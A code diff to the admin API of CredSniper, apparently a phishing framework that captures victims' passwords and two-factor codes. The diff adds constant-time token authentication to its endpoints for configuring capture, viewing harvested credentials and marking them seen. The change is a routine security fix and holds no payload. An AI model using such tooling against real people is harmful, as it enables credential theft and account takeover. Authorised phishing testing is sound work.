@@ -1,5 +1,6 @@
 from flask import jsonify, redirect, request, abort
 from core import functions
+from hmac import compare_digest
 
 class CredSniperAPI():
     def __init__(self, token):
@@ -17,7 +18,14 @@ class CredSniperAPI():
         ]
 
 
+    def authenticate(self, request):
+        token = request.args.get('api_token')
+        if not token or not compare_digest(token, self.api_token):
+            abort(401, {'message': 'Invalid API token'})
+
+
     def config(self):
+        self.authenticate(request)
         if request.method == 'POST':
             enable_2fa = request.form['enable_2fa']
             set_module = request.form['module']
@@ -41,20 +49,20 @@ class CredSniperAPI():
 
 
     def creds_view(self):
-        token = request.args.get('api_token')
-        if not token == self.api_token:
-            abort(401, {'message': 'Invalid API token'})
+        self.authenticate(request)
         self.creds = functions.reload_creds(self.seen)
         return jsonify(self.creds)
 
 
     def creds_seen(self, cred_id):
+        self.authenticate(request)
         self.seen.add(cred_id)
         self.creds = functions.reload_creds(self.seen)
         return jsonify(list(self.seen))
 
 
     def creds_2fa(self, user,password):
+        self.authenticate(request)
         response = {'success': True,'user': user}
         return jsonify(response)
 
